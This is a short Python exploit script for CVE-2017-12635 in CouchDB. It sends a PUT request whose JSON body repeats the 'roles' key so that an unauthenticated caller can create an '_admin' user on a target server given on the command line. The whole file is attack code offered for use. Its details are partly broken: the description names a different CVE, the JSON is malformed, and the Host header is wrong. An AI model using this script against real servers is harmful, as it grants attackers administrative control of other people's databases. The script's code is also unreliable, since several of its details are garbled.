'''
CVE-2017-12635  CouchDB
written by ophxc
'''
import requests
import argparse
import json
from urllib.parse import urlparse

parser=argparse.ArgumentParser(description="usage of CVE-2018-8715")
parser.add_argument("-i","--ip",help="the target url",required=True)
parser.add_argument("-n","--name",help="the username you make",required=True)
parser.add_argument("-p","--password",help="the password you want to make",required=True)
args=parser.parse_args()

ip="http://"+args.ip+":5984/_users/org.couchdb.user:vulhub"
username=args.name
password=args.password

poc='''{
  "type": "user",
  "name":'''+username+'''
  "roles": ["_admin"],
  "roles": [],
  "password": '''+password+'''
}
'''
proxy = {
    'http': '127.0.0.1:8080'
}

head={
'Host': ip+":5984",
'Accept':'*/*',
'Accept-Language':'en',
'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
'Connection':'close',
'Content-Type': 'application/json'
}

rea=requests.put(url=ip,headers=head,data=poc,proxies=proxy)

if "ok" not in rea.text:
    print("oh,no")
else:
    print("ok , please login to check")